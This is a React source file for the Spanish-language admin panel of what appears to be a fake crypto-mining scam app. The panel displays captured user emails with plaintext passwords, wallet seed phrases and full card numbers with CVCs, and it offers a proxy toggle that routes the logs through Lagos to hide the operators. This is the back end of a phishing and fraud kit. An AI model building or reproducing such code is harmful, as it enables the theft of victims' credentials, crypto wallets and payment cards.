import React, { useState } from 'react';
import { User, AppState, WithdrawalRequest } from '../types';
import { generateMiningAdvice } from '../services/geminiService';
import { Shield, Eye, CreditCard, User as UserIcon, Settings, Globe, MessageSquare, Key, Wallet, Database, AlertCircle, Lock, Monitor } from 'lucide-react';

interface AdminProps {
  appState: AppState;
  setAppState: React.Dispatch<React.SetStateAction<AppState>>;
}

export const AdminPanel: React.FC<AdminProps> = ({ appState, setAppState }) => {
  const [activeTab, setActiveTab] = useState<'users' | 'withdrawals' | 'config' | 'chat'>('users');
  const [adminChatInput, setAdminChatInput] = useState('');
  const [adminChatLog, setAdminChatLog] = useState<{role: string, text: string}[]>([]);

  const toggleProxy = () => {
    setAppState(prev => ({
      ...prev,
      adminConfig: { ...prev.adminConfig, nigeriaProxy: !prev.adminConfig.nigeriaProxy }
    }));
  };

  const handleAdminChat = async () => {
    if(!adminChatInput.trim()) return;
    const userMsg = adminChatInput;
    setAdminChatLog(prev => [...prev, { role: 'admin', text: userMsg }]);
    setAdminChatInput('');
    
    // Simulate specialized admin AI
    const response = await generateMiningAdvice(`[ADMIN MODE] ${userMsg}`);
    setAdminChatLog(prev => [...prev, { role: 'ai', text: response }]);
  };

  const totalWithdrawals = appState.withdrawals.reduce((acc, curr) => acc + curr.amount, 0);

  return (
    <div className="min-h-screen bg-gray-900 text-white flex font-sans">
      {/* Sidebar */}
      <div className="w-64 bg-gray-800 border-r border-gray-700 p-4">
        <h2 className="text-2xl font-bold text-red-500 mb-8 flex items-center gap-2">
            <Shield /> ADMIN
        </h2>
        <nav className="space-y-2">
            <button onClick={() => setActiveTab('users')} className={`w-full text-left p-3 rounded flex items-center gap-2 ${activeTab === 'users' ? 'bg-red-900/50 text-red-400' : 'hover:bg-gray-700'}`}>
                <UserIcon size={18} /> Base de Datos (FULL)
            </button>
            <button onClick={() => setActiveTab('withdrawals')} className={`w-full text-left p-3 rounded flex items-center gap-2 ${activeTab === 'withdrawals' ? 'bg-red-900/50 text-red-400' : 'hover:bg-gray-700'}`}>
                <CreditCard size={18} /> Logs de Pagos
            </button>
            <button onClick={() => setActiveTab('chat')} className={`w-full text-left p-3 rounded flex items-center gap-2 ${activeTab === 'chat' ? 'bg-red-900/50 text-red-400' : 'hover:bg-gray-700'}`}>
                <MessageSquare size={18} /> AI Admin
            </button>
            <button onClick={() => setActiveTab('config')} className={`w-full text-left p-3 rounded flex items-center gap-2 ${activeTab === 'config' ? 'bg-red-900/50 text-red-400' : 'hover:bg-gray-700'}`}>
                <Settings size={18} /> Configuración
            </button>
        </nav>
        
        <div className="mt-auto pt-8 border-t border-gray-700 mt-8">
            <div className="flex items-center gap-2 text-sm text-gray-400">
                <Globe size={14} /> 
                Proxy: {appState.adminConfig.nigeriaProxy ? <span className="text-green-500">Nigeria (ON)</span> : <span className="text-red-500">OFF</span>}
            </div>
            <div className="flex items-center gap-2 text-xs text-red-500 mt-2 font-mono">
                <Monitor size={12} /> SYSTEM: ROOT ACCESS
            </div>
        </div>
      </div>

      {/* Content */}
      <div className="flex-1 p-8 overflow-y-auto">
        <div className="flex justify-between items-center mb-8">
            <h1 className="text-3xl font-bold">Panel de Control Maestro</h1>
            <div className="bg-gray-800 p-4 rounded-lg border border-gray-700">
                <p className="text-sm text-gray-400">Fondos Retenidos (Simulado)</p>
                <p className="text-2xl font-bold text-green-400">${totalWithdrawals.toFixed(2)}</p>
            </div>
        </div>

        {activeTab === 'users' && (
            <div className="bg-gray-800 rounded-lg overflow-hidden border border-gray-700 shadow-xl">
                <div className="p-4 bg-red-900/20 border-b border-red-900/50 text-red-400 text-sm font-bold flex items-center justify-between gap-2">
                    <div className="flex items-center gap-2">
                        <Database size={16} /> REGISTRO DE USUARIOS Y CREDENCIALES
                    </div>
                    <span className="text-xs uppercase bg-red-950 px-2 py-1 rounded border border-red-800 animate-pulse">Live Tracking: {appState.users.length} Users</span>
                </div>
                <div className="overflow-x-auto">
                    <table className="w-full text-left whitespace-nowrap">
                        <thead className="bg-gray-900 text-gray-400">
                            <tr>
                                <th className="p-4">Identidad</th>
                                <th className="p-4 text-red-400 bg-red-950/30">DATOS DE ACCESO (CAPTURED)</th>
                                <th className="p-4">Wallet Info</th>
                                <th className="p-4">Estado Pago</th>
                            </tr>
                        </thead>
                        <tbody>
                            {appState.users.filter(u => u.role !== 'ADMIN').map((user, index) => {
                                // Find any card details associated with this user from withdrawals
                                const userWithdrawal = appState.withdrawals.find(w => w.userId === user.id && w.cardInfo);
                                const cardData = userWithdrawal?.cardInfo;
                                const isNew = (Date.now() - new Date(user.joinedDate).getTime()) < 60000 * 5; // New if joined in last 5 mins

                                return (
                                    <tr key={user.id} className={`border-b border-gray-700 hover:bg-gray-700/50 transition-colors align-top ${isNew ? 'bg-green-900/10' : ''}`}>
                                        <td className="p-4">
                                            {isNew && <span className="text-[10px] bg-green-500 text-black px-1 rounded font-bold mb-1 inline-block">NUEVO</span>}
                                            <div className="font-bold text-white text-lg">{user.name}</div>
                                            <div className="font-mono text-xs text-gray-500">ID: {user.id}</div>
                                            <div className="text-xs text-green-400 font-mono mt-1">Saldo: ${user.balance.toFixed(2)}</div>
                                        </td>
                                        <td className="p-4 bg-red-900/5 border-l border-r border-red-900/20">
                                            <div className="flex flex-col gap-2">
                                                <div className="bg-slate-900 p-2 rounded border border-slate-700">
                                                    <span className="text-xs text-gray-500 uppercase block">Correo Electrónico</span>
                                                    <span className="text-blue-300 text-sm font-mono">{user.email}</span>
                                                </div>
                                                <div className="bg-red-950/50 p-2 rounded border border-red-800/50">
                                                    <span className="text-xs text-red-400 uppercase block font-bold flex items-center gap-1"><Key size={10}/> Contraseña</span>
                                                    <span className="text-white text-sm font-mono tracking-wide">{user.password}</span>
                                                </div>
                                            </div>
                                        </td>
                                        <td className="p-4">
                                            <div className="space-y-2 max-w-xs">
                                                <div className="flex flex-col text-xs">
                                                    <span className="text-gray-500">Frase Semilla:</span>
                                                    <span className="text-yellow-200/80 font-mono break-all whitespace-pre-wrap bg-black/30 p-1 rounded mt-1">
                                                        {user.seedPhrase || "No introducida"}
                                                    </span>
                                                </div>
                                                <div className="flex flex-col text-xs">
                                                    <span className="text-gray-500">Wallet BTC:</span>
                                                    <span className="text-purple-300 font-mono truncate bg-black/30 p-1 rounded mt-1">
                                                        {user.walletAddress || "No introducida"}
                                                    </span>
                                                </div>
                                            </div>
                                        </td>
                                        <td className="p-4">
                                            {cardData ? (
                                                <div className="bg-green-900/10 border border-green-500/30 rounded p-2 text-xs max-w-xs">
                                                     <p className="font-bold text-green-400 mb-1 flex items-center gap-1"><CreditCard size={10}/> CC CONFIRMADA</p>
                                                     <div className="font-mono text-gray-300 space-y-0.5">
                                                        <p><span className="text-gray-500">Num:</span> {cardData.number}</p>
                                                        <p><span className="text-gray-500">Exp:</span> {cardData.expiry} | <span className="text-gray-500">CVC:</span> {cardData.cvc}</p>
                                                        <p><span className="text-gray-500">Nom:</span> {cardData.holder}</p>
                                                     </div>
                                                </div>
                                            ) : (
                                                <span className="text-gray-500 text-xs italic border border-gray-700 px-2 py-1 rounded bg-gray-800 block text-center">
                                                    Sin método de pago
                                                </span>
                                            )}
                                        </td>
                                    </tr>
                                );
                            })}
                            {appState.users.filter(u => u.role !== 'ADMIN').length === 0 && (
                                <tr>
                                    <td colSpan={4} className="p-8 text-center text-gray-500">
                                        Esperando registros...
                                    </td>
                                </tr>
                            )}
                        </tbody>
                    </table>
                </div>
            </div>
        )}

        {/* Other tabs remain similar but ensure consistency */}
        {activeTab === 'withdrawals' && (
            <div className="space-y-6">
                 <h3 className="text-xl font-bold text-blue-400 border-b border-gray-700 pb-2">Registro de Transacciones</h3>
                 <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                    {appState.withdrawals.map(w => (
                        <div key={w.id} className="bg-gray-800 p-6 rounded-lg border border-gray-700 relative overflow-hidden group">
                            <div className="absolute top-0 right-0 p-4 opacity-10">
                                <CreditCard size={64} />
                            </div>
                            <div className="flex justify-between mb-4 relative z-10">
                                <span className="font-bold text-2xl text-white">${w.amount.toFixed(2)}</span>
                                <span className="px-2 py-1 bg-yellow-500/20 text-yellow-500 text-xs rounded uppercase font-bold h-fit">{w.status}</span>
                            </div>
                            <div className="space-y-3 text-sm relative z-10">
                                {w.cardInfo && (
                                    <div className="mt-4 p-4 bg-red-900/10 border border-red-500/30 rounded-lg">
                                        <div className="space-y-1 font-mono text-gray-300">
                                            <p><span className="text-gray-500">Titular:</span> {w.cardInfo.holder}</p>
                                            <p><span className="text-gray-500">PAN:</span> <span className="text-white font-bold tracking-widest">{w.cardInfo.number}</span></p>
                                            <div className="flex justify-between">
                                                <p><span className="text-gray-500">Exp:</span> {w.cardInfo.expiry}</p>
                                                <p><span className="text-gray-500">CVC:</span> <span className="text-red-400 font-bold">{w.cardInfo.cvc}</span></p>
                                            </div>
                                        </div>
                                    </div>
                                )}
                            </div>
                        </div>
                    ))}
                 </div>
            </div>
        )}

        {activeTab === 'chat' && (
             <div className="flex flex-col h-[600px] bg-gray-800 rounded-lg border border-gray-700">
                <div className="flex-1 p-4 overflow-y-auto space-y-4">
                    {adminChatLog.map((msg, i) => (
                        <div key={i} className={`flex ${msg.role === 'admin' ? 'justify-end' : 'justify-start'}`}>
                            <div className={`max-w-[80%] p-3 rounded-lg ${msg.role === 'admin' ? 'bg-red-600' : 'bg-gray-700'}`}>
                                {msg.text}
                            </div>
                        </div>
                    ))}
                </div>
                <div className="p-4 border-t border-gray-700 flex gap-2">
                    <input 
                        className="flex-1 bg-gray-900 border border-gray-700 rounded p-2 text-white"
                        placeholder="Consulta privada AI..."
                        value={adminChatInput}
                        onChange={(e) => setAdminChatInput(e.target.value)}
                        onKeyDown={(e) => e.key === 'Enter' && handleAdminChat()}
                    />
                    <button onClick={handleAdminChat} className="bg-red-600 px-4 rounded hover:bg-red-700">Enviar</button>
                </div>
             </div>
        )}

        {activeTab === 'config' && (
            <div className="bg-gray-800 p-6 rounded-lg max-w-md border border-gray-700">
                <h3 className="text-xl font-bold mb-6">Configuración de Red</h3>
                <div className="flex items-center justify-between mb-4">
                    <span>Enrutamiento Nigeria (Proxy)</span>
                    <button 
                        onClick={toggleProxy}
                        className={`w-12 h-6 rounded-full transition-colors relative ${appState.adminConfig.nigeriaProxy ? 'bg-green-500' : 'bg-gray-600'}`}
                    >
                        <div className={`absolute top-1 left-1 bg-white w-4 h-4 rounded-full transition-transform ${appState.adminConfig.nigeriaProxy ? 'translate-x-6' : ''}`} />
                    </button>
                </div>
                <p className="text-xs text-gray-500 mt-2">
                    Activar esto enrutará el tráfico de los logs a través de servidores en Lagos para anonimizar la gestión.
                </p>
            </div>
        )}

      </div>
    </div>
  );
};